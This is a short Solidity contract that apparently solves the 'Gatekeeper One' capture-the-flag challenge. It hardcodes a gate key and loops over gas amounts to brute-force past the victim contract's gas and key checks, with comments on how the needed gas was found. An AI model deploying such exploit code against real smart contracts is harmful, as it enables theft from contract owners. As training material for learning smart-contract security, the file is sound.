// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeper.sol";

contract GatekeeperAttack {
    GatekeeperOne public victimContract;
    bytes8 gateKey = 0xffffffff0000d7E1;

    constructor (address _victimContractAddress) {
        victimContract = GatekeeperOne(_victimContractAddress);
    } 

    function attack() public {
    for (uint256 i = 0; i < 120; i++) {
        (bool success, ) = address(victimContract).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if(success){
            break;
        }
    }
    }

    function getTxOrigin() public view returns(address){
        return tx.origin;
    }

    //Very difficult challenge as it was very hard to predict a starting point for gas estimate (800000), I had to Google at the end! (for a more efficient solution)
    
    //But running the code on a local node we find out that the required gas is "802929".
}
